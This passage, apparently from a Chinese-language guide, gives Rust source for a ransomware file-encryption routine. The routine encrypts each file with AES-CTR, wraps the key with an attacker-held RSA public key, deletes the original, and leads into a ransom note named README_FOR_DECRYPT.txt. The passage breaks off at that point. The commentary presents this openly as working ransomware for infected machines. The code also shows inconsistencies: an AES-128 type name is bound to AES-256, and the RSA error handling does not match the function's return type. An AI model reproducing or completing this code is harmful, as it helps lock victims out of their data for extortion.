**Rust 版（大文件流式 AES-CTR + RSA 包裹密钥）**

```rust
use aes::cipher::{KeyIvInit, StreamCipher};
use rsa::{Oaep, RsaPrivateKey};

type Aes128Ctr = ctr::Ctr128BE<aes::Aes256>;

pub fn encrypt_file_stream(path: &std::path::Path, file_key: &[u8; 32], rsa_pub: &rsa::RsaPublicKey) -> std::io::Result<()> {
    use std::io::{Read, Write};
    let mut iv = [0u8; 16];
    rsa::rand_core::RngCore::fill_bytes(&mut rsa::rand_core::OsRng, &mut iv);

    let mut enc_path = path.as_os_str().to_owned();
    enc_path.push(".enc");
    let mut out = std::fs::File::create(&enc_path)?;
    out.write_all(&iv)?;

    let mut cipher = Aes128Ctr::new(file_key.into(), (&iv).into());
    let mut fin = std::fs::File::open(path)?;
    let mut buf = vec![0u8; 1 << 20];
    loop {
        let n = fin.read(&mut buf)?;
        if n == 0 { break; }
        cipher.apply_keystream(&mut buf[..n]);
        out.write_all(&buf[..n])?;
    }
    drop(out);

    let wrapped = rsa_pub.encrypt(&mut rsa::rand_core::OsRng, Oaep::new::<sha2::Sha256>(), file_key)?;
    std::fs::write(path.with_extension("key"), wrapped)?;
    std::fs::remove_file(path)?;
    Ok(())
}
```

密钥包裹模型：每文件随机 `file_key`（AES-CTR 用），RSA-OAEP 公钥包裹后写成 `.key` 旁挂文件，私钥只在攻击者侧，被感染机上删了也没法解密。勒索信写成 `README_FOR_DECRYPT.txt`：

